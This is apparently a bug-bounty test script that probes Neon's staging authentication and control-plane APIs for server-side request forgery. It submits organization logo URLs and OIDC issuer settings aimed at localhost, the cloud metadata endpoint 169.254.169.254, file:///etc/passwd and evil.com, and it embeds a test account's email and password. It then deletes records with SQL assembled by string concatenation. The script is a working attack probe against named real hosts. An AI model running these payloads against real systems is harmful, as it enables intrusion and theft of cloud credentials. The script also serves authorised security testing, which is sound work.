# -*- coding: utf-8 -*-
"""V22: SSRF surfaces - org logo URL + control-plane auth provider config.
A. org update data.logo = URL -> stored only, or fetched (timing/error diff)?
   targets: 127.0.0.1:1 (fast fail), 169.254.169.254 (IMDS), httpbin, file://
B. control-plane: GET auth providers config shape; try custom OIDC provider
   with attacker issuer -> server discovery fetch? (SSRF)"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(host, method, path, body=None, cookie=None, origin="http://localhost:3000",
       timeout=30, extra=None):
    try:
        conn = http.client.HTTPSConnection(host, timeout=timeout, context=ctx)
        hdrs = {"Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if origin is not None:
            hdrs["Origin"] = origin
        if cookie:
            hdrs["Cookie"] = cookie
        if extra:
            hdrs.update(extra)
        conn.request(method, path, json.dumps(body).encode() if body is not None else None, headers=hdrs)
        t0 = time.time()
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        return resp.status, data, ck, time.time() - t0
    except Exception as e:
        return None, str(e)[:150], "", 0


def auth(email, pw=PASS):
    st, data, ck, _ = na(NA_HOST, "POST", "/neondb/auth/sign-in/email",
                         {"email": email, "password": pw})
    return ck.split(";")[0] if st in (200, 201) else None


def cp(method, path, body=None, timeout=30):
    return na(API_HOST, method, API_BASE + path, body, timeout=timeout,
              extra={"Authorization": "Bearer " + APIKEY})


def main():
    out("== V22 SSRF surfaces ==")
    c1 = auth(U1)
    out("cookie: %s" % bool(c1))
    if not c1:
        return
    # ---- A. org logo URL ----
    st, d, _, _ = na(NA_HOST, "POST", "/neondb/auth/organization/create",
                     {"name": "v22-org", "slug": "v22%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return
    urls = [
        ("logo=127.0.0.1:1", "http://127.0.0.1:1/x.png"),
        ("logo=IMDS", "http://169.254.169.254/latest/meta-data/"),
        ("logo=httpbin", "https://httpbin.org/anything"),
        ("logo=file", "file:///etc/passwd"),
        ("logo=evil-https", "https://evil.com/logo.png"),
    ]
    for tag, u in urls:
        st, d, _, dt = na(NA_HOST, "POST", "/neondb/auth/organization/update",
                          {"organizationId": org, "data": {"logo": u}}, c1)
        out("%-16s -> %d (%.2fs) %s" % (tag, st, dt, d[:120]))
    # read back
    st, d, _, _ = na(NA_HOST, "GET", "/neondb/auth/organization/list", c1)
    out("readback org: %s" % d[:250])
    # ---- B. providers config shape ----
    st, d, _, _ = cp("GET", "/projects/%s/branches/%s/auth/providers" % (PA, PAMAIN))
    out("GET providers -> %d %s" % (st, d[:400]))
    st, d, _, _ = cp("GET", "/projects/%s/branches/%s/auth/config" % (PA, PAMAIN))
    out("GET auth/config -> %d %s" % (st, d[:400]))
    # try custom provider with internal issuer (discovery fetch probe)
    st, d, _, _ = cp("POST", "/projects/%s/branches/%s/auth/providers" % (PA, PAMAIN),
                     {"type": "oidc", "issuer": "http://169.254.169.254/latest/meta-data/",
                      "clientId": "test", "clientSecret": "test"})
    out("POST oidc IMDS issuer -> %d %s" % (st, d[:300]))
    st, d, _, _ = cp("POST", "/projects/%s/branches/%s/auth/providers" % (PA, PAMAIN),
                     {"type": "oidc", "issuer": "http://127.0.0.1:1/x", "clientId": "t", "clientSecret": "t"})
    out("POST oidc 127 issuer  -> %d %s" % (st, d[:300]))
    st, d, _, _ = cp("POST", "/projects/%s/branches/%s/auth/providers" % (PA, PAMAIN),
                     {"type": "github", "clientId": "t", "clientSecret": "t"})
    out("POST github provider  -> %d %s" % (st, d[:300]))
    # cleanup
    st, d, _, _ = na(NA_HOST, "POST", "/neondb/auth/organization/delete", {"organizationId": org}, c1)
    out("cleanup org -> %d" % st)
    db_uri = None
    try:
        st2, d2, _, _ = cp("GET", "/projects/%s/connection_uri?database_name=neondb"
                            "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN))
        db_uri = json.loads(d2).get("uri")
    except Exception:
        pass
    if db_uri:
        from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
        p = urlsplit(db_uri)
        q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
        uri2 = urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))
        import psycopg
        with psycopg.connect(uri2, connect_timeout=15) as conn:
            conn.autocommit = True
            with conn.cursor() as cur:
                cur.execute("DELETE FROM neon_auth.organization WHERE id=%s" % ("'" + org + "'"))
                cur.execute("DELETE FROM neon_auth.member WHERE \"organizationId\"=%s" % ("'" + org + "'"))
        out("db purge done")
    out("done")


if __name__ == "__main__":
    main()
